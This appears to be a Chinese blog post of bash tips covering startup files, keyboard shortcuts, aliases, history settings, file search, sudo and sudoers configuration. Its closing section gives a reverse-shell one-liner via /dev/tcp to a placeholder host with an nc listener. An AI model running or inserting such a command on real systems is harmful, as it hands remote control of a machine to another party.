&lt;h1 id=&quot;shell是什么？&quot;&gt;&lt;a href=&quot;#shell是什么？&quot; class=&quot;headerlink&quot; title=&quot;shell是什么？&quot;&gt;&lt;/a&gt;shell是什么？&lt;/h1&gt;&lt;p&gt;shell是一类解释性语言，通过其解释器与操作系统内核进行交互，shell分为Bshell 和Cshell两大类，我们所熟悉的bash和zsh都属于Bshell一类。shell脚本有两种执行方式，一种为交互式执行，即通常我们在Linux上的执行方式，一次只能执行一条命令（当然你可以把多条命令写到一行），多条命令不能同时执行。另一种方式为脚本执行，即把多条shell语句写到一个.sh文件里，然后在文件头#！/bin/bash调用解释器执行，这种方式的优点在于可重复执行和自动化。但shell的脚本通常不易读，所以展现shell优势的地方主要还是在交互执行中。&lt;br&gt;另外可以在/etc/shells文件里查看当前系统支持的shell。&lt;br&gt;bash作为大部分类Linux系统的标配，下面我主要围绕bash来讲。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;bash启动顺序&quot;&gt;&lt;a href=&quot;#bash启动顺序&quot; class=&quot;headerlink&quot; title=&quot;bash启动顺序&quot;&gt;&lt;/a&gt;bash启动顺序&lt;/h1&gt;&lt;p&gt;1./etc/profile :此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行。并从/etc/profile.d目录的配置文件中搜集shell的设置。&lt;br&gt;2.~/.bash_profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件。&lt;br&gt;3.~/.bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该文件被读取。&lt;br&gt;4.~/.bash_logout:当每次退出系统(退出bash shell)时,执行该文件。&lt;/p&gt;
&lt;p&gt;注意&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;~/.bash_profile 是交互式、login 方式进入 bash 运行的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;~/.bashrc 是交互式 non-login 方式进入 bash 运行的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;通常二者设置大致相同，所以通常前者会调用后者。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;所以我们通常会吧环境变量的一些设置保存在~/.bash_profile中，把一些命令行，脚本调用写到~/.bashrc里面&lt;/p&gt;
&lt;h1 id=&quot;bash快捷键&quot;&gt;&lt;a href=&quot;#bash快捷键&quot; class=&quot;headerlink&quot; title=&quot;bash快捷键&quot;&gt;&lt;/a&gt;bash快捷键&lt;/h1&gt;&lt;h2 id=&quot;用好你的Control键&quot;&gt;&lt;a href=&quot;#用好你的Control键&quot; class=&quot;headerlink&quot; title=&quot;用好你的Control键&quot;&gt;&lt;/a&gt;用好你的Control键&lt;/h2&gt;&lt;p&gt;Control键是所有类Unix系统（Mac, Linux）下一个非常有用的按键，但也是一个经常被忽视的按键，特别是在Mac平台下，Command键完全代替了在Windows平台下的Ctrl键，很多人不清楚为什么Apple又额外加了一个Control键，我想这和著名的Emacs编辑器有关，Emacs下有很多方便的快捷键，其中很多都需要用到Control键，Mac系统就原生继承了很多这些快捷键，下面就根据我在实际开发过程中遇到的具体情况来总结一下如何用好Control键，效率真能提高不少。&lt;/p&gt;
&lt;h3 id=&quot;Control的常用组合键&quot;&gt;&lt;a href=&quot;#Control的常用组合键&quot; class=&quot;headerlink&quot; title=&quot;Control的常用组合键&quot;&gt;&lt;/a&gt;Control的常用组合键&lt;/h3&gt;&lt;p&gt;移动类&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Control-F 前进光标 (效果同右方向键)&lt;/li&gt;
&lt;li&gt;Control-B 后退光标（效果同左方向键)&lt;/li&gt;
&lt;li&gt;Control-P 光标上移（效果同上方向键）&lt;/li&gt;
&lt;li&gt;Control-N 光标下移（效果同下方向键）&lt;/li&gt;
&lt;li&gt;Control-A 光标移动到行首&lt;/li&gt;
&lt;li&gt;Control-E 光标移动到行尾&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt; 删除类&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Control-D 删除光标后面的一个字符&lt;/li&gt;
&lt;li&gt;Control-H 删除光标前面的一个字符&lt;/li&gt;
&lt;li&gt;Control-K 删除当前行光标以后的所有字符&lt;/li&gt;
&lt;li&gt;Control-W 删除光标前的一个单词&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Control-U 删除当前行的所有字符&lt;br&gt;其它类&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Control-T 交换光标两边的字符&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Control-L 清屏(仅适用于终端下)&lt;h3 id=&quot;一些常用场景&quot;&gt;&lt;a href=&quot;#一些常用场景&quot; class=&quot;headerlink&quot; title=&quot;一些常用场景&quot;&gt;&lt;/a&gt;一些常用场景&lt;/h3&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;通常情况下，上下左右键都远离主键盘区，如果在你高速打字的过程中需要移动输入光标位置，这个时候直接通过上下左右键就不得不将右手移出主键盘区，就会降低输入的速度，通常这个时候你就可以通过Control的组合键达到快速移动光标的目的。再比如你在一些IDE(Xcode,Android Studio等)里面选择代码补全的不同候选项时，就可以通过Control-P与Control-N来达到切换选择不同候选项的操作.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Mac的键盘上没有Home与End键, 如果你想将光标快速移动到行首与行尾就比较麻烦(当然你可以通过Command与-&amp;gt; 或Command与&amp;lt;-实现,但这样你又需要去操作方向键, 方向键远离主键盘区, 速度势必会降低), 这时你就可以通过Control-A 与 Control-E实现, 这两个组合键非常适合在终端下使用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;有些时候你在终端下输入了很长的命令, 但发现输入有误, 需要完全删除重新输入, 通常情况下你都会使用Delete键去做, 但Delete只能一次删除一个字符, 速度很慢, 这时你就可以通过Control-U键快速的达到清除当前所有输入的目的, 再比如你当前的输入只有从中间某个位置向后是错误的, 这时你可以通过Control-B或Control-F将光标移动到对应位置, 然后再利用Control-K快速达到删除当前光标后所有输入的目的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在输入的过程中如果发现个别字符不对需要删除重新输入, 你当然可以通过Delete键达到, 但 Delete键和方向键一样有点远, 更方便的你可以通过Control-D 与 Control-H实现, 还有些时候错的不是一个或几个字符,而是一个或几个单词你可以Control-W达到&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在终端下如何清屏? 很多人都是通过输入clear达到, 但如果这时你终端里正输入的有一条待执行的命令,这条命令的输出可能有很多你想清一下屏后再执行, 你怎么办,总不能删除当前命令后再输入clear命令, 然后再重新输入刚才的那条命令吧, 其实这时你可以通过Control-L组合键达到目的,这个差不多是我在终端下用的最多的一个快捷键了.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;关于编辑模式的设置&quot;&gt;&lt;a href=&quot;#关于编辑模式的设置&quot; class=&quot;headerlink&quot; title=&quot;关于编辑模式的设置&quot;&gt;&lt;/a&gt;关于编辑模式的设置&lt;/h3&gt;&lt;p&gt;在交互式执行bash中，可以通过set -o的方式查看当前编辑模式，我们通常采用set -o emaces的方式设置以上快捷键为可操作，需要注意的是，如果你不选择一种快捷键设置”set +o emaces”你连最熟悉的上下键切换history命令都用不了。&lt;/p&gt;
&lt;h2 id=&quot;alias&quot;&gt;&lt;a href=&quot;#alias&quot; class=&quot;headerlink&quot; title=&quot;alias&quot;&gt;&lt;/a&gt;alias&lt;/h2&gt;&lt;p&gt;bash的一个将长命令替换为短命令的方式，可以直接在bash交互执行中输入alias查看已经被设置的快捷键，以&lt;code&gt;alias la=&amp;#39;ls -al&amp;#39;&lt;/code&gt;的方式设置快捷键，当然直接键入命令只对当前打开的shell有效，如果想长期生效，我们通常的做法是把它写到/etc/profile.d/目录下的shell里面，会被/etc/profile调用的一个全局配置。当然在工作环境中我们会把它配到home目录下（因为/etc目录下会对所有用户生效，想想也是不科学的）所以我们更经常写到~/.bashrc里面。&lt;/p&gt;
&lt;h1 id=&quot;关于环境变量&quot;&gt;&lt;a href=&quot;#关于环境变量&quot; class=&quot;headerlink&quot; title=&quot;关于环境变量&quot;&gt;&lt;/a&gt;关于环境变量&lt;/h1&gt;&lt;p&gt;bash的环境变量可以用&lt;code&gt;set&lt;/code&gt; &lt;code&gt;env&lt;/code&gt; 两种方式查看，这里主要说一下两种变量的区别，当你在命令行中用赋值的方式申明一个变量，(example: TEXT=123)，这个变量只存在set中，即当前shell生效，不会传递到subshell里面，如果是文本执行的脚本，这种变量申明方式定义的变量也只会在文件内生效，如果想让别的脚本调用这些变量,可以通过export的方式将变量导入到env里面，可以理解为全局变量。&lt;br&gt;这里我还想提一个比较有意思的环境变量PS1，你可以将它设置为&lt;code&gt;export PS1=&amp;quot;(\!) \[\e[31m\] \[\A\] \[\e[32m\]\u@\h \[\e[34m\]\w \[\e[30m\]$&amp;quot;&lt;/code&gt;试一下，是个非常有意思的值。&lt;/p&gt;
&lt;h1 id=&quot;windows和Linux脚本的转换问题&quot;&gt;&lt;a href=&quot;#windows和Linux脚本的转换问题&quot; class=&quot;headerlink&quot; title=&quot;windows和Linux脚本的转换问题&quot;&gt;&lt;/a&gt;windows和Linux脚本的转换问题&lt;/h1&gt;&lt;p&gt;我们都知道windows和Linux的文件类型不同，那么在windows下编写的脚本如何在Linux下执行呢？当我们从windows下拷贝一个文件到Linux上，可以使用&lt;code&gt;cat -A&lt;/code&gt;命令查看到文件隐藏字符，发现有很多脏数据，于是可以用&lt;code&gt;dos2unix file.sh&lt;/code&gt;的方式把文件转化过来。&lt;/p&gt;
&lt;h1 id=&quot;关于历史命令&quot;&gt;&lt;a href=&quot;#关于历史命令&quot; class=&quot;headerlink&quot; title=&quot;关于历史命令&quot;&gt;&lt;/a&gt;关于历史命令&lt;/h1&gt;&lt;p&gt;history可以查看当前用户的历史命令，每个用户的history藏在~/.bash_hitory下，可以查看。&lt;br&gt;可以使用&lt;code&gt;!!&lt;/code&gt;执行上一条命令 &lt;code&gt;![number]&lt;/code&gt;执行第number条命令，&lt;code&gt;！[string]&lt;/code&gt;执行以string开头的上一条命令&lt;br&gt;另外control+r可以根据字符串快捷搜索历史命令.&lt;/p&gt;
&lt;h1 id=&quot;关于参数传递&quot;&gt;&lt;a href=&quot;#关于参数传递&quot; class=&quot;headerlink&quot; title=&quot;关于参数传递&quot;&gt;&lt;/a&gt;关于参数传递&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;`` $()&lt;br&gt; 这两种方式是相同的，即重新打开一个shell执行完退出，并使用返回值代替脚本调用部分内容&lt;/li&gt;
&lt;li&gt;&lt;p&gt;| xargs 区别于管道符，是将前面的命令作为后面命令的命令参数，而管道符是将前面输出作为后面命令的标准输入。&lt;br&gt; 再解释一 | 和 | xargs 的区别：&lt;/p&gt;
 &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;echo -l | ls 输出： 等同于 ls&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo -l | xargs ls 输出 等同于 ls -l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt; 好了，剩下的自己体会。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;find 的 -exec&lt;br&gt; xargs有个缺点，在大量执行命令（成千上万）的时候可能因为执行的命令过多失败，而find的-exec 是为逐个命令执行，不会遇到此类问题，作为-exec的标配，应该在后面加上{} \;末尾的\;其实是转意，恩，此处按下不表。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;关于文件查找&quot;&gt;&lt;a href=&quot;#关于文件查找&quot; class=&quot;headerlink&quot; title=&quot;关于文件查找&quot;&gt;&lt;/a&gt;关于文件查找&lt;/h1&gt;&lt;p&gt;find 是一个事实文件便利工具，比较强大,可以用&lt;code&gt;find / -name &amp;quot;*.sh&amp;quot;&lt;/code&gt;的方式查找/中包含.sh结尾的文件，如果遇到一堆permission deny的问题可以用输出重定向的方式解决&lt;code&gt;find /-name &amp;quot;*.sh&amp;quot; 2&amp;gt;&amp;gt; /dev/null&lt;/code&gt;（2为文件状态符，0表示标准输入，1表示标准输出，2表示错误输出，&amp;gt;&amp;gt;为重定向，表示将输出叠加导入到后面的文件中,/dev/null为Linux系统的垃圾桶）,这个命令比较常用，但是效率很低，占用内存也比较高，推荐使用locate命令，类似于window系统里的everything，将文件信息保存在/var/lib/mlocate/mlocatedb数据库里，使用&lt;code&gt;updatedb&lt;/code&gt;更新数据库，&lt;code&gt;locate filename&lt;/code&gt;的方式查找文件，更高效，速度也更快。&lt;/p&gt;
&lt;h1 id=&quot;关于bash-history&quot;&gt;&lt;a href=&quot;#关于bash-history&quot; class=&quot;headerlink&quot; title=&quot;关于bash_history&quot;&gt;&lt;/a&gt;关于bash_history&lt;/h1&gt;&lt;p&gt;放一个bash_histroy的命令：&lt;a href=&quot;http://rockhong.github.io/history-in-bash.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://rockhong.github.io/history-in-bash.html&lt;/a&gt;&lt;br&gt;bash使用的历史命令会先写入内存（在退出subshell之前在.bash_history中不可见，也不可传递到子进程），在退出shell的时候写入子进程。这里说几个对bash_history的需求以及解决方案。&lt;/p&gt;
&lt;h2 id=&quot;多个终端不覆盖history&quot;&gt;&lt;a href=&quot;#多个终端不覆盖history&quot; class=&quot;headerlink&quot; title=&quot;多个终端不覆盖history:&quot;&gt;&lt;/a&gt;多个终端不覆盖history:&lt;/h2&gt;&lt;p&gt;如果同一用户在不同终端登录，bash_histroy只能保存最后一个用户登录的bash_histroy，解决这个问题：&lt;br&gt;简单来说，你在.bashrc里面添加这句就够了：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;shopt -s histappend&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;history上限设大：&quot;&gt;&lt;a href=&quot;#history上限设大：&quot; class=&quot;headerlink&quot; title=&quot;history上限设大：&quot;&gt;&lt;/a&gt;history上限设大：&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 设置历史记录条数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export HISTFILESIZE=40000000&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 设置显示历史记录条数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export HISTSIZE=10000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;history定期备份&quot;&gt;&lt;a href=&quot;#history定期备份&quot; class=&quot;headerlink&quot; title=&quot;history定期备份&quot;&gt;&lt;/a&gt;history定期备份&lt;/h2&gt;&lt;p&gt;很多情况下我们希望保存更多的bash_history以方便以后查阅，但是如果把.bash_history设置得很大的话，bash在启动时会占用大量内存（100000条大概要10M），这是我们不想看到的，所以应该养成定期备份的习惯，推荐把bash_histroy按时间备份比如每天+data&amp;gt;&amp;gt;bash_histroy.back.&lt;/p&gt;
&lt;h1 id=&quot;关于sudo&quot;&gt;&lt;a href=&quot;#关于sudo&quot; class=&quot;headerlink&quot; title=&quot;关于sudo&quot;&gt;&lt;/a&gt;关于sudo&lt;/h1&gt;&lt;p&gt;这里我要说的是用户切换&lt;br&gt;大家都知道su命令是用来切换用户的，su - 可以完全切换到用户（新开一个shell，加载~/.bash_profile及~/.bashrc），但是在有的情况下，sudo -iu 也可以切换用户。&lt;br&gt;首先：&lt;code&gt;sudo -i&lt;/code&gt; 是以root身份新开一个shell，&lt;code&gt;sudo -u &amp;lt;user&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;是以user身份执行command，现在我要说一条神奇的命令：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo -iu &amp;lt;user&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;它等价于&lt;code&gt;sudo -u root &amp;lt;user_shell&amp;gt;&lt;/code&gt;&lt;br&gt;是不是很神奇？&lt;br&gt;我们来看一个更神奇的:&lt;br&gt;visudo(当然需要root身份或者sudo权限)，编辑/etc/sudoers（或者/etc/sudoers.d/文件下的文件），添加如下代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;user1 ALL=(user2) NOPASSWD: &amp;lt;user_shell&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;就可以让user1免密码sudo到user2，是不是很有趣。&lt;br&gt;顺便说一下你可以使用这个配置来管理所有sudo权限。&lt;/p&gt;
&lt;h1 id=&quot;另外记几个Linux下的常用工具&quot;&gt;&lt;a href=&quot;#另外记几个Linux下的常用工具&quot; class=&quot;headerlink&quot; title=&quot;另外记几个Linux下的常用工具&quot;&gt;&lt;/a&gt;另外记几个Linux下的常用工具&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1. tldr 查看文档用的，安装比较复杂，而且是联网查找，虚拟机上速度可能会比较慢&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo yum -y install epel-release&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo yum -y install python-pip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install --upgrade pip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install tldr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. tmux 据说是screen的进阶版，分屏用的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3. lsof端口查看&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4. nc网络瑞士军刀，占用端口:nc -k -l -p 8080 2&amp;gt;&amp;gt; /dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5. shudown 可以定时关机，重启，取消关机&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6. pstree 进程树&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7. grep 逐行扫描文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8. wc 统计&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9. top 查看内存等信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10. rpm 包管理（二进制包）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11. sl 仅仅是为了好玩，小火车开过。。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12. cmatrix 也是为了好玩，黑客帝国&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;最后说一下bash和zsh哪个好&quot;&gt;&lt;a href=&quot;#最后说一下bash和zsh哪个好&quot; class=&quot;headerlink&quot; title=&quot;最后说一下bash和zsh哪个好&quot;&gt;&lt;/a&gt;最后说一下bash和zsh哪个好&lt;/h1&gt;&lt;p&gt;当然是zsh好啦，具体怎么好，你不需要太知道，总之zsh比bash很多地方都要强大，在bash的基础上增加了一些配置。。&lt;/p&gt;
&lt;h1 id=&quot;记一个bash遇到的小坑&quot;&gt;&lt;a href=&quot;#记一个bash遇到的小坑&quot; class=&quot;headerlink&quot; title=&quot;记一个bash遇到的小坑&quot;&gt;&lt;/a&gt;记一个bash遇到的小坑&lt;/h1&gt;&lt;p&gt;bash的变量只会被扫描替换一遍，所以当我们的变量里包含其他变量我们需要扫描两遍需要使用eval，类似于python的eval()将字符串当做表达式，用法如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s=Start&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Start_ops=hello&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;name=$1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo &amp;quot;$s&amp;quot;&amp;quot;_ops&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;eval echo \$&amp;quot;$s&amp;quot;_ops &amp;quot;$name&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行 ./test.sh world&lt;br&gt;打印出hello word&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但是！！&lt;/strong&gt;我现在要说的是请不要使用这种方式，因为邪恶的eval会引起bash注入的问题，就提示到这里，剩下的自己感受。。&lt;/p&gt;
&lt;h1 id=&quot;推荐一个Linux命令查询的网站&quot;&gt;&lt;a href=&quot;#推荐一个Linux命令查询的网站&quot; class=&quot;headerlink&quot; title=&quot;推荐一个Linux命令查询的网站&quot;&gt;&lt;/a&gt;推荐一个Linux命令查询的网站&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://man.linuxde.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://man.linuxde.net/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;再列一堆Linux下贼好用的工具&quot;&gt;&lt;a href=&quot;#再列一堆Linux下贼好用的工具&quot; class=&quot;headerlink&quot; title=&quot;再列一堆Linux下贼好用的工具&quot;&gt;&lt;/a&gt;再列一堆Linux下贼好用的工具&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;另外： 后面还得写一个关于vim的快捷操作的文章。&lt;/p&gt;
&lt;h1 id=&quot;bash-反弹shell&quot;&gt;&lt;a href=&quot;#bash-反弹shell&quot; class=&quot;headerlink&quot; title=&quot;bash 反弹shell&quot;&gt;&lt;/a&gt;bash 反弹shell&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/2333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 然后在x.x.x.x这台server上执行：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nc -l 2333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近一段时间在学习bash，作为一个小总结，记录一些bash使用的技巧以及知识点。&lt;/p&gt;
&lt;h1 id=&quot;shell是什么？&quot;&gt;&lt;a href=&quot;#shell是什么？&quot; class=&quot;headerlink&quot; title=&quot;shell是什么？&quot;&gt;&lt;/a&gt;shell是什么？&lt;/h1&gt;&lt;p&gt;shell是一类解释性语言，通过其解释器与操作系统内核进行交互，shell分为Bshell 和Cshell两大类，我们所熟悉的bash和zsh都属于Bshell一类。shell脚本有两种执行方式，一种为交互式执行，即通常我们在Linux上的执行方式，一次只能执行一条命令（当然你可以把多条命令写到一行），多条命令不能同时执行。另一种方式为脚本执行，即把多条shell语句写到一个.sh文件里，然后在文件头#！/bin/bash调用解释器执行，这种方式的优点在于可重复执行和自动化。但shell的脚本通常不易读，所以展现shell优势的地方主要还是在交互执行中。&lt;br&gt;另外可以在/etc/shells文件里查看当前系统支持的shell。&lt;br&gt;bash作为大部分类Linux系统的标配，下面我主要围绕bash来讲。&lt;br&gt;
    
    </summary>
    
    
